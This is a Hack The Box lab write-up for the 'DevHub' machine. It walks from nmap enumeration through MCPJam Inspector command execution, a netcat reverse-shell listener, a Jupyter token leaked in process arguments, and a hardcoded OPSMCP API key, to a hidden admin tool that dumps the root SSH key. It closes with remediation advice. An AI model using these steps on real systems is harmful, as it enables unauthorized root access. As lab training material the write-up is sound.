# HTB DevHub — Write-up

> **Hack The Box lab write-up**
>
> **Flags are intentionally omitted.** This document focuses on the enumeration, exploitation, privilege-escalation path, and lessons learned.

---

## Overview

**Target:** `10.129.245.216`

### Attack Chain

```text
Nmap
  │
  ├── 80/tcp  → Web application
  │
  └── 6274/tcp → MCPJam Inspector
                    │
                    ▼
             Command Execution
                    │
                    ▼
                mcp-dev
                    │
                    ├── Jupyter :8888
                    │       │
                    │       ▼
                    │    analyst
                    │
                    └── OPSMCP :5000
                            │
                            ▼
                     API key discovery
                            │
                            ▼
                    Hidden admin tool
                            │
                            ▼
                     SSH key disclosure
                            │
                            ▼
                       root SSH
```

---

# 1. Enumeration

Initial service enumeration:

```bash
nmap -sC -sV -Pn 10.129.245.216
```

Interesting services:

```text
22/tcp    OpenSSH 8.9p1
80/tcp    nginx 1.18.0
6274/tcp  MCPJam Inspector
```

The main interesting service was port `6274`, which exposed the MCPJam Inspector interface.

---

# 2. MCPJam Inspector

The service was inspected with:

```bash
curl -i http://10.129.245.216:6274/
```

The response identified the MCPJam Inspector web application.

The MCP connection API was then tested:

```text
/api/mcp/connect
```

An empty request produced:

```json
{"success":false,"error":"serverConfig is required"}
```

This indicated that the endpoint accepted a user-controlled `serverConfig`.

---

# 3. Initial Command Execution

The MCP connection functionality was vulnerable to command execution.

In the authorized HTB environment, a reverse shell was obtained through the vulnerable MCP connection mechanism.

Listener:

```bash
nc -lvnp 5555
```

After exploitation, the shell landed as:

```text
mcp-dev@devhub
```

At this point the initial foothold was established.

---

# 4. Local Service Enumeration

From the `mcp-dev` shell, localhost services were checked.

The OPSMCP service was found on port `5000`:

```bash
curl -s http://127.0.0.1:5000
```

Response:

```json
{
  "auth":"Required - X-API-Key header",
  "endpoints":["/tools/list","/tools/call","/health"],
  "server":"OPSMCP",
  "status":"operational",
  "version":"2.1.0"
}
```

This showed that an internal management API was running locally.

---

# 5. Jupyter Discovery

Process enumeration revealed a Jupyter Lab instance:

```bash
ps aux | grep jupyter
```

Important parameters included:

```text
--ip=127.0.0.1
--port=8888
--no-browser
```

The process arguments also exposed the Jupyter authentication token.

The service was therefore accessible locally at:

```text
127.0.0.1:8888
```

A Jupyter terminal was created through its API and accessed through the terminal WebSocket endpoint.

This provided access to the `analyst` context.

---

# 6. OPSMCP Process

Process enumeration from the analyst context showed an important root-owned process:

```text
/home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
```

The important observation was:

```text
root → /opt/opsmcp/server.py
```

So the OPSMCP application was running with root privileges.

---

# 7. OPSMCP API Key

The OPSMCP source contained authentication information.

The relevant source was inspected with:

```bash
grep -nEi 'api.?key|admin_dump|5000|root|ssh' /opt/opsmcp/server.py
```

A hardcoded API key was discovered.

For this write-up, the actual credential is intentionally **redacted**.

The same source also revealed an administrative function:

```text
ops._admin_dump
```

This was particularly interesting because it was not exposed by the normal tools listing.

---

# 8. Enumerating OPSMCP Tools

Using the discovered API key:

```bash
curl -s \
-H 'X-API-Key: <REDACTED>' \
http://127.0.0.1:5000/tools/list
```

The normal tools included:

```text
ops.system_status
ops.list_services
ops.check_disk
ops.view_logs
```

However, the source code showed an additional administrative function:

```text
ops._admin_dump
```

---

# 9. Hidden Administrative Function

The hidden function was called through:

```text
/tools/call
```

Initial invocation returned:

```json
{
  "error":"Confirmation required",
  "usage":"Set confirm=true to proceed",
  "warning":"This dumps sensitive credentials"
}
```

Adding the required confirmation parameter revealed the accepted targets:

```text
ssh_keys
passwords
tokens
```

The `ssh_keys` target was then used in the lab environment.

---

# 10. SSH Key Disclosure

The administrative dump returned sensitive credential material containing:

```text
root_private_key
```

The response was saved locally because the interactive shell did not display the full JSON cleanly.

The key was extracted into:

```text
/tmp/root_key
```

Permissions were restricted:

```bash
chmod 600 /tmp/root_key
```

The recovered key was validated with:

```bash
ssh-keygen -y -f /tmp/root_key
```

A valid SSH public key was produced, confirming that the private key was usable.

---

# 11. Root Access

The recovered key was used to authenticate as root:

```bash
ssh -i /tmp/root_key -o StrictHostKeyChecking=no root@10.129.245.216
```

After authentication:

```bash
id
```

returned:

```text
uid=0(root) gid=0(root) groups=0(root)
```

This confirmed full root access.

---

# 12. Flags

As requested, **no user or root flag values are included in this README**.

The final objective was reached by obtaining root access through the OPSMCP administrative functionality and its exposed SSH private key.

---

# 13. Vulnerabilities Identified

## 13.1 MCP Command Execution

The MCP connection endpoint accepted attacker-controlled command configuration, resulting in command execution.

**Impact:** Initial remote code execution and service-account compromise.

---

## 13.2 Jupyter Token Exposure

The Jupyter authentication token was exposed through process arguments.

**Impact:** Local users able to inspect the process could authenticate to the Jupyter service and obtain terminal access.

---

## 13.3 Hardcoded API Credential

The OPSMCP application contained a hardcoded API key.

**Impact:** Local access to the service could be authenticated without obtaining the credential through a secure mechanism.

---

## 13.4 Hidden Privileged Administrative Function

`ops._admin_dump` was capable of exposing sensitive credentials while the application itself ran as root.

**Impact:** Credential disclosure leading directly to root SSH access.

---

## 13.5 Root-Owned Service

The OPSMCP service was executed by root:

```text
root → /opt/opsmcp/server.py
```

A compromise of its API or sensitive functionality therefore had root-level consequences.

---

# 14. Remediation

### MCP Service

- Do not allow arbitrary command execution through user-controlled MCP configuration.
- Validate and allowlist executable commands.
- Run MCP services with the minimum required privileges.
- Apply authentication and authorization to administrative endpoints.

### Jupyter

- Do not expose authentication tokens through command-line arguments.
- Bind management interfaces only where necessary.
- Use secure authentication configuration.
- Separate sensitive services from untrusted local users.

### OPSMCP

- Remove hardcoded API keys from source code.
- Store secrets in a secure secret-management mechanism.
- Remove hidden administrative endpoints from production interfaces.
- Require strong authorization for credential-management functions.
- Never expose root SSH private keys through an API.

### Privilege Separation

- Do not run application-level management services as root.
- Use dedicated service accounts.
- Apply filesystem and process permissions according to least privilege.

---

# Conclusion

The DevHub attack path combined several security weaknesses:

1. MCP command execution provided the initial foothold.
2. Local service enumeration exposed Jupyter.
3. Jupyter process arguments exposed authentication material.
4. OPSMCP was running as root.
5. Its source contained a hardcoded API credential.
6. A hidden administrative function exposed the root SSH private key.
7. The recovered key provided root SSH access.

The most important lesson is that **multiple individually avoidable configuration and authorization issues can combine into a complete system compromise**.

